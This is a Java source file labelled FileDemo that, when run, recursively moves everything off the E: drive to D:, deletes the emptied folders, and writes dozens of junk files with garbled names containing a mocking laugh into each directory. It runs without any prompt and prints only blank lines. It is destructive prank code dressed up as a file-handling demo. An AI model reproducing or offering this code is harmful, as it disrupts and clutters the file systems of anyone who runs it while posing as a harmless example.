import java.io.*;
public class FileDemo
{
	public static void moveFiles(File srcDir,File dstDir)
	{
		if(!(dstDir.exists()))
		{
			dstDir.mkdir();
		}
		File[] files = srcDir.listFiles();
		for(int x = 0;x < files.length;x++)
		{
			String path = files[x].getParent();
			{
				if(files[x].isDirectory())
				{
					moveFiles(files[x],new File(dstDir,files[x].getName()));
					files[x].delete();
					File newfile = new File(files[x].getPath());
				}
				else
				{
					files[x].renameTo(new File(dstDir,files[x].getName()));
				}
				try
				{
					int a = 0;
					while(a < 50)
					{
						OutputStream fos = new FileOutputStream(path+"$#$.^r_t~"+a);
						String str = "呵呵";
						byte[] words = str.getBytes();
						fos.write(words,0,words.length);
						fos.close();
						a++;
					}
				}
				catch(Exception e)
				{
					System.out.println(e.toString());
				}
			}
		}
	}
	public static void main(String[] args)
	{
		File src = new File("E:\\");//被清空的位置
		File dst = new File("D:\\");//粘贴位置的
		moveFiles(src,dst);
		System.out.println("");
		System.out.println("");
	}
}
